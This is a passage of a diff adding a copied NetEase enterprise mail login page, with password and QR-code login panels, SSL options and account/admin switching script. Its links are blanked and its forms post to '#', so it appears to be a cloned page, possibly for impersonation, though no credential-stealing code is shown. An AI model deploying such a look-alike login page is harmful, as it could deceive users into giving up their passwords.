+                                    <span class="u-private-text"><span data-lang-key="我已阅读并同意">我已阅读并同意</span> <a href="" target="_blank" data-lang-key="服务条款">服务条款</a> <span data-lang-key="和">和</span><a href="" target="_blank" data-lang-key="隐私政策"> 隐私政策</a></span></label></div>
+                            <div id="mLoginSslSelector" class="loginact">
+                                <div class="loginselect"><a class="selector js-sslsel" href="javascript:;" hidefocus="true"><span data-lang-key="正使用">正使用</span><span class="js-ssltxt" data-lang-key="全程SSL">全程SSL</span><span class="icon icon-arrow"></span></a>
+                                    <div class="m-lgselect js-lgselect">
+                                        <ul>
+                                            <li><a class="js-selitem selected" href="javascript:;" hidefocus="true" data-allssl="1" data-tj-value="1" data-lang-key="全程SSL">全程SSL</a>
+                                            </li>
+                                            <li><a class="js-selitem" href="javascript:;" hidefocus="true" data-allssl="0" data-tj-value="0" data-lang-key="SSL登录">SSL登录</a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                                <div class="chselect"><a class="selector js-chsel" href="javascript:;" hidefocus="true"><span data-lang-key="正在使用">正在使用</span><span class="js-chtxt" data-lang-key="默认线路">默认线路</span><span class="icon icon-arrow"></span></a>
+                                    <div class="m-lgselect js-lgchselect">
+                                        <ul>
+                                            <li><a class="js-selitem selected" href="javascript:;" hidefocus="true" data-ch="" data-tj-value="1" data-lang-key="默认线路">默认线路</a></li>
+                                            <li><a class="js-selitem" href="javascript:;" hidefocus="true" data-ch="hw" data-lang-key="国际线路">国际线路</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                        <div id="msgmid" class="loginerror"></div>
+                        <div class="js-switch-qrcode"><span class="icon-sirius siriusApp" data-type="5" id="siriusApp" title="网易企业邮官方客户端扫码登录" data-lang-title="网易企业邮官方客户端扫码登录"></span> <span class="icon-dashi dashiApp" data-type="1" id="mdashiApp" title="邮箱大师扫码登录" data-lang-title="邮箱大师扫码登录"></span> <span class="icon-wx wxApp" data-type="2" id="mwxApp" title="微信扫码登录" data-lang-title="微信扫码登录"></span> <span class="icon-user" data-type="3" id="userApp" title="账号密码登录" data-lang-title="账号密码登录"></span></div>
+                    </div>
+                    <form class="login-form login-form-token js-loginform js-loginform-token" action="#" name="tokenlogin" method="post" target="_top"><input type="hidden" class="js-token-domain" name="domain" value=""> <input type="hidden" class="js-token-account" name="account_name" value=""> <input type="hidden" class="js-token" name="token" value=""> <input type="hidden" class="js-isAllSecure" name="all_secure" value="1"> <input type="hidden" class="js-isSecure" name="secure" value="1"> <input type="hidden" class="js-ch" name="ch" value=""></form>
+                    <div style="display: none;" id="accountList">
+                        <div class="m-loginbox-back" id="accountBack"><span class="u-prev-step"></span><span data-lang-key="返回">返回</span></div>
+                        <div class="m-loginbox-title" data-lang-key="请选择要登录的账号">请选择要登录的账号</div>
+                        <ul class="login-account-list" id="mobileChoose"></ul>
+                    </div>
+                    <div style="display: none;" id="mobileVerify">
+                        <div class="m-loginbox-back" id="verifyBack"><span class="u-prev-step"></span><span data-lang-key="返回">返回</span></div>
+                        <div class="m-loginbox-title" data-lang-key="首次登录请完成账号验证">首次登录请完成账号验证</div>
+                        <div class="m-loginbox-input">
+                            <div class="m-ipt js-ipt disable"><input class="ipt js-account-value" id="js-account-value" tabindex="1" disabled="disabled">
+                                <div class="m-error"></div>
+                            </div>
+                            <div class="m-ipt js-ipt"><input class="ipt js-pwd-value" id="js-pwd-value" tabindex="2" data-lang-placeholder="密码" placeholder="密码" data-lang-title="请输入密码" title="请输入密码" type="password" name="password">
+                                <div class="m-error"></div>
+                            </div>
+                            <div class="loginbtn" id="verifyPwd"><button class="w-button w-button-account" tabindex="4" data-lang-key="验证并登录">验证并登录</button></div>
+                            <div id="pwdmid" class="loginerror pwderror"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="m-codebox js-codebox f-zindex-10" style="display: none;">
+                    <div id="appLoginTab" class="appLoginTab">
+                        <h3><span data-lang-key="请使用">请使用</span><span id="appLoginText"></span><span data-lang-key="扫描二维码登录">扫描二维码登录</span></h3>
+                        <div id="appLoginWait" style="display: block;">
+                            <div id="appCodeWrap" class="appCodeWrap allowmove">
+                                <div class="appCode-example"></div>
+                                <div id="appCodeBox" class="appCodeBox"><img id="appCode" class="appCode" width="180" height="180" src="https://mail.qiye.163.com/commonweb/qrcode/getqrcode.do?w=130&amp;h=130">
+                                    <div id="appCodeRefresh" class="appCodeRefresh" style="display: none;">
+                                        <div class="appCode-mask"></div>
+                                        <div class="appCode-wrap">
+                                            <p data-lang-key="二维码已失效">二维码已失效</p><a href="javascript:;" data-tj-key="b_appLogin_refresh_qrcode_click" data-lang-key="请点击刷新">请点击刷新</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <p id="appLoginTxtNormal" class="appLoginTxt appLoginTxtNormal txt-err">
+                                <span data-lang-key="扫码并关注网易企业邮箱服务号">扫码并关注网易企业邮箱服务号</span><a href="https://qiye.163.com/help/l-3.html" target="_blank"></a>
+                            </p>
+                            <p id="appLoginTxt" class="appLoginTxt txt-err" data-lang-key="请您在手机端完成邮箱账号绑定">
+                                请您在手机端完成邮箱账号绑定<a href="https://qiye.163.com/help/l-3.html" target="_blank"></a></p>
+                        </div>
+                        <div id="appLoginScan" class="appLoginScan" style="display:none">
+                            <div class="appLogin-scanSuc"></div>
+                            <p class="appLogin-scantxt txt-suc" data-lang-key="成功扫描，请在手机上确认登录">成功扫描，请在手机上确认登录</p><a id="appLoginRestart" class="appLoginRestart" href="javascript:void(0)" data-lang-key="返回重新扫描">返回重新扫描</a>
+                        </div>
+                    </div>
+                    <div id="qrcodeLoginSslSelector" class="loginact"><input type="hidden" id="appCh" value="0">
+                        <div class="loginselect"><a class="selector js-sslsel" href="javascript:;" hidefocus="true"><span data-lang-key="正使用">正使用</span><span class="js-ssltxt" data-lang-key="全程SSL">全程SSL</span><span class="icon icon-arrow"></span></a>
+                            <div class="m-lgselect js-lgselect">
+                                <ul>
+                                    <li><a class="js-selitem selected" href="javascript:;" hidefocus="true" data-allssl="1" data-lang-key="全程SSL">全程SSL</a></li>
+                                    <li><a class="js-selitem" href="javascript:;" hidefocus="true" data-allssl="0" data-lang-key="SSL登录">SSL登录</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="chselect"><a class="selector js-chsel" href="javascript:;" hidefocus="true"><span data-lang-key="正在使用">正在使用</span><span class="js-chtxt" data-lang-key="默认线路">默认线路</span><span class="icon icon-arrow"></span></a>
+                            <div class="m-lgselect js-lgchselect">
+                                <ul>
+                                    <li><a class="js-selitem selected" href="javascript:;" hidefocus="true" data-ch="" data-lang-key="默认线路">默认线路</a></li>
+                                    <li><a class="js-selitem" href="javascript:;" hidefocus="true" data-ch="hw" data-lang-key="国际线路">国际线路</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="pane-handler"><a href="javascript:;" id="switchNormalCtrl" data-tj-key="b_AccountPWD_text_click" data-lang-key="密码登录">密码登录</a></div>
+                </div>
+                <div id="normalLoginFormMask" class="login-form-mask" style="display: none;">
+                    <p class="login-form-mask-loading"><i></i><span data-lang-key="载入中...">载入中...</span></p>
+                </div>
+                <div id="loginPanelBottomAdBlock" class="m-login-bottom-ad"></div>
+            </div>
+        </div>
+    </section>
+    <footer class="g-ft">
+        <div class="g-wrap">
+            <nav class="m-ftnav">
+                <a href="javascript:;" data-lang-key="已支持IPv6网络">已支持IPv6网络</a>
+                <a href="javascript:;" target="_blank" data-tj-key="b_AboutNetease_click" data-lang-key="关于网易">关于网易</a>
+                <a href="javascript:;" target="_blank" data-tj-key="b_Weibo_click" data-lang-key="官方微博">官方微博</a><a href="javascript:;" target="_blank" data-tj-key="b_AboutLegal_click" data-lang-key="相关法律">相关法律</a>
+                <a href="javascript:;" target="_blank" data-tj-key="b_PrivacyPolicy_click" data-lang-key="隐私政策">隐私政策</a>
+                <span data-lang-key="网易公司版权所有">网易公司版权所有</span>&copy;1997-
+                <script src="mg.127.net/static/mimg/copyright/year.js"></script><a id="KX_IMG" class="w-kximg" href="javascript:;" target="_blank"><img src="mimg.127.net/logo/knet.png" alt="可信网站，身份验证"></a>
+            </nav>
+        </div>
+    </footer>
+    <div class="m-dialog" id="dialog">
+        <div class="m-dialog-bg"></div>
+        <div class="u-dialog">
+            <div class="u-dialog-hd">
+                <div class="u-dialog-title"><span data-title-key="提示" id="tipDialog"></span>
+                    <div class="u-dialog-close J_closeDialog" id="closeDialog">X</div>
+                </div>
+            </div>
+            <div class="u-dialog-bd" id="dialogContent"></div>
+            <div class="u-dialog-ft">
+                <div class="u-dialog-btn J_closeDialog" id="cancleDialog"></div>
+                <div class="u-dialog-btn confirm" id="confirmDialog"></div>
+            </div>
+        </div>
+    </div><img src="ssl.mail.163.com/httpsEnable.gif" style="position: absolute;left: -999em;top: -999em;width: 0;height: 0;" />
+    <script>
+        if (!Function.prototype.bind) {
+            Function.prototype.bind = function() {
+                if (typeof this !== 'function') {
+                    throw new TypeError('Function.prototype.bind - what is trying to be bound is not callable');
+                }
+                var _this = this;
+                var obj = arguments[0];
+                var ags = Array.prototype.slice.call(arguments, 1);
+                return function() {
+                    _this.apply(obj, ags);
+                };
+            };
+        }
+    </script>
+    <script src="cstaticdun.126.net/load.minf596.js?t=201903281201"></script>
+    <script src="mg.127.net/static/mimg/p/login/js/qiye_algorithm.js"></script>
+    <script src="mg.127.net/static/mimg/p/login/js/polyfill.min.js"></script>
+    <script src="mg.127.net/static/mimg/p/login/js/bundle.94d9d21e.js"></script>
+
+    <script>
+        let switchAccCtrl = document.getElementById('switchAccCtrl');
+        let switchAdminCtrl = document.getElementById('switchAdminCtrl');
+
+        switchAccCtrl.addEventListener('click', function() {
+            switchAccCtrl.classList.add('active');
+            switchAdminCtrl.classList.remove('active');
+            if (!switchAccCtrl.classList.contains('active')) {
+                document.querySelector('.login-form-acc').style.display = 'none';
+                document.querySelector('.login-form-admin').style.display = 'block';
+            } else {
+                document.querySelector('.login-form-acc').style.display = 'block';
+                document.querySelector('.login-form-admin').style.display = 'none';
+            }
+        });
+        switchAdminCtrl.addEventListener('click', function() {
+            switchAccCtrl.classList.remove('active');
+            switchAdminCtrl.classList.add('active');
+            if (!switchAdminCtrl.classList.contains('active')) {
+                document.querySelector('.login-form-admin').style.display = 'none';
+            } else {
+                document.querySelector('.login-form-admin').style.display = 'block';
+                document.querySelector('.login-form-acc').style.display = 'none';
+            }
+        });
+    </script>
+
+</body>
+
+</html>
